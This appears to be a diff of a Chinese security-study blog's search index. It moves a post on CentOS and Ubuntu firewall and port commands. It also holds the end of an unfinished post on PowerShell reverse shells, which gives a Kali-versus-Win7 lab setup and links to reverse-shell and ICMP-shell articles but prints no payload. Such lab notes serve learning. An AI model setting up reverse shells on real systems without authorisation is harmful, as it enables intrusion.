-<h2 id="powershell反弹shell的方法"><a href="#powershell反弹shell的方法" class="headerlink" title="powershell反弹shell的方法"></a>powershell反弹shell的方法</h2><p>测试环境说明</p>
-<p>攻击者：kali2020.03 64位 192.168.229.129</p>
-<p>靶机：win7 x64 192.168.229.134</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
-<p>emmm暂时先鸽了</p>
-<h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
-<p><a href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
-]]></content>
   </entry>
   <entry>
     <title>常见web漏洞学习之CSRF</title>
@@ -1606,38 +1606,6 @@
       <tags>
         <tag>文件上传</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>端口那些事</title>
-    <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
-    <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
-<h2 id="centos下"><a href="#centos下" class="headerlink" title="centos下"></a>centos下</h2><h3 id="查看已经开放的所有端口"><a href="#查看已经开放的所有端口" class="headerlink" title="查看已经开放的所有端口"></a>查看已经开放的所有端口</h3><p> <code>netstat -anp</code></p>
-<h3 id="查看端口被哪个服务占用"><a href="#查看端口被哪个服务占用" class="headerlink" title="查看端口被哪个服务占用"></a>查看端口被哪个服务占用</h3><p><code>netstat -anp | grep 端口号</code></p>
-<h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><p><code>systemctl status firewalld</code></p>
-<p><img src="https://i.loli.net/2021/07/05/qgC2dVhBQRUEc84.png" alt="image-20210705163816093"></p>
-<p><img src="https://i.loli.net/2021/07/05/d5mTi73gSVhyGMP.png" alt="image-20210705095620194"></p>
-<h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><p> <code>ps PID</code></p>
-<p><img src="https://i.loli.net/2021/07/05/GEUzN6YjfeWwgO7.png"></p>
-<h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><p> <code>kill -9 PID</code></p>
-<h3 id="开启-关闭防火墙："><a href="#开启-关闭防火墙：" class="headerlink" title="开启/关闭防火墙："></a>开启/关闭防火墙：</h3><p><code>systemctl start/stop firewalld</code></p>
-<h3 id="查看防火墙所有开放的端口："><a href="#查看防火墙所有开放的端口：" class="headerlink" title="查看防火墙所有开放的端口："></a>查看防火墙所有开放的端口：</h3><p><code>firewall-cmd --zone=public --list-ports</code></p>
-<p><img src="https://i.loli.net/2021/07/05/T7Vr2jNFoUflEWb.png" alt="image-20210705162443473"></p>
-<h3 id="查看某一端口是否开放："><a href="#查看某一端口是否开放：" class="headerlink" title="查看某一端口是否开放："></a>查看某一端口是否开放：</h3><p><code>firewall-cmd --query-port=端口/tcp</code></p>
-<p><img src="https://i.loli.net/2021/07/05/F7jXHMA5IsGNnwx.png" alt="image-20210705163024044"></p>
-<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><code>firewall-cmd --add-port=端口号/tcp --permanent</code></p>
-<h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p><code>firewall-cmd --permanent --remove-port=端口号/tcp</code></p>
-<p><img src="https://i.loli.net/2021/08/19/87XlK9j1esyLfGR.png" alt="image-20210819175722813"></p>
-<h2 id="ubuntu-下还略有不同"><a href="#ubuntu-下还略有不同" class="headerlink" title="ubuntu 下还略有不同"></a>ubuntu 下还略有不同</h2><h3 id="查看防火墙当前状态"><a href="#查看防火墙当前状态" class="headerlink" title="查看防火墙当前状态"></a>查看防火墙当前状态</h3><p><code>ufw status</code></p>
-<p><img src="https://i.loli.net/2021/07/05/RMgqjh9wQPKvmS6.png" alt="image-20210705180504549"></p>
-<h3 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h3><p><code>ufw enable/disable</code></p>
-<h3 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h3><p><code>ufw version</code></p>
-<h3 id="开放某一端口"><a href="#开放某一端口" class="headerlink" title="开放某一端口"></a>开放某一端口</h3><p><code>ufw allow 端口号</code></p>
-<h3 id="禁止某一端口"><a href="#禁止某一端口" class="headerlink" title="禁止某一端口"></a>禁止某一端口</h3><p><code>ufw delete allow  端口号</code>或是<code>ufw deny 端口号</code></p>
-<h3 id="允许-拒绝外部访问本机"><a href="#允许-拒绝外部访问本机" class="headerlink" title="允许/拒绝外部访问本机"></a>允许/拒绝外部访问本机</h3><p><code>ufw default allow/deny</code></p>
-<h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
-<p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
-]]></content>
   </entry>
   <entry>
     <title>内网学习笔记</title>
@@ -2026,6 +1994,38 @@
       <tags>
         <tag>内网</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>端口那些事</title>
+    <url>/2021/06/28/%E7%AB%AF%E5%8F%A3%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
+    <content><![CDATA[<p>想要开放端口，要先去了解防火墙状态和网络命令</p>
+<h2 id="centos下"><a href="#centos下" class="headerlink" title="centos下"></a>centos下</h2><h3 id="查看已经开放的所有端口"><a href="#查看已经开放的所有端口" class="headerlink" title="查看已经开放的所有端口"></a>查看已经开放的所有端口</h3><p> <code>netstat -anp</code></p>
+<h3 id="查看端口被哪个服务占用"><a href="#查看端口被哪个服务占用" class="headerlink" title="查看端口被哪个服务占用"></a>查看端口被哪个服务占用</h3><p><code>netstat -anp | grep 端口号</code></p>
+<h3 id="查看防火墙状态"><a href="#查看防火墙状态" class="headerlink" title="查看防火墙状态"></a>查看防火墙状态</h3><p><code>systemctl status firewalld</code></p>
+<p><img src="https://i.loli.net/2021/07/05/qgC2dVhBQRUEc84.png" alt="image-20210705163816093"></p>
+<p><img src="https://i.loli.net/2021/07/05/d5mTi73gSVhyGMP.png" alt="image-20210705095620194"></p>
+<h3 id="查看进程的详细信息"><a href="#查看进程的详细信息" class="headerlink" title="查看进程的详细信息"></a>查看进程的详细信息</h3><p> <code>ps PID</code></p>
+<p><img src="https://i.loli.net/2021/07/05/GEUzN6YjfeWwgO7.png"></p>
+<h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><p> <code>kill -9 PID</code></p>
+<h3 id="开启-关闭防火墙："><a href="#开启-关闭防火墙：" class="headerlink" title="开启/关闭防火墙："></a>开启/关闭防火墙：</h3><p><code>systemctl start/stop firewalld</code></p>
+<h3 id="查看防火墙所有开放的端口："><a href="#查看防火墙所有开放的端口：" class="headerlink" title="查看防火墙所有开放的端口："></a>查看防火墙所有开放的端口：</h3><p><code>firewall-cmd --zone=public --list-ports</code></p>
+<p><img src="https://i.loli.net/2021/07/05/T7Vr2jNFoUflEWb.png" alt="image-20210705162443473"></p>
+<h3 id="查看某一端口是否开放："><a href="#查看某一端口是否开放：" class="headerlink" title="查看某一端口是否开放："></a>查看某一端口是否开放：</h3><p><code>firewall-cmd --query-port=端口/tcp</code></p>
+<p><img src="https://i.loli.net/2021/07/05/F7jXHMA5IsGNnwx.png" alt="image-20210705163024044"></p>
+<h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p><code>firewall-cmd --add-port=端口号/tcp --permanent</code></p>
+<h3 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h3><p><code>firewall-cmd --permanent --remove-port=端口号/tcp</code></p>
+<p><img src="https://i.loli.net/2021/08/19/87XlK9j1esyLfGR.png" alt="image-20210819175722813"></p>
+<h2 id="ubuntu-下还略有不同"><a href="#ubuntu-下还略有不同" class="headerlink" title="ubuntu 下还略有不同"></a>ubuntu 下还略有不同</h2><h3 id="查看防火墙当前状态"><a href="#查看防火墙当前状态" class="headerlink" title="查看防火墙当前状态"></a>查看防火墙当前状态</h3><p><code>ufw status</code></p>
+<p><img src="https://i.loli.net/2021/07/05/RMgqjh9wQPKvmS6.png" alt="image-20210705180504549"></p>
+<h3 id="开启-关闭防火墙"><a href="#开启-关闭防火墙" class="headerlink" title="开启/关闭防火墙"></a>开启/关闭防火墙</h3><p><code>ufw enable/disable</code></p>
+<h3 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h3><p><code>ufw version</code></p>
+<h3 id="开放某一端口"><a href="#开放某一端口" class="headerlink" title="开放某一端口"></a>开放某一端口</h3><p><code>ufw allow 端口号</code></p>
+<h3 id="禁止某一端口"><a href="#禁止某一端口" class="headerlink" title="禁止某一端口"></a>禁止某一端口</h3><p><code>ufw delete allow  端口号</code>或是<code>ufw deny 端口号</code></p>
+<h3 id="允许-拒绝外部访问本机"><a href="#允许-拒绝外部访问本机" class="headerlink" title="允许/拒绝外部访问本机"></a>允许/拒绝外部访问本机</h3><p><code>ufw default allow/deny</code></p>
+<h3 id="允许某一网段的ip进行访问"><a href="#允许某一网段的ip进行访问" class="headerlink" title="允许某一网段的ip进行访问"></a>允许某一网段的ip进行访问</h3><p><code>ufw allow from 10.0.0.0/8</code></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
+<p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
+]]></content>
   </entry>
   <entry>
     <title>常见web漏洞学习之sql注入学习</title>
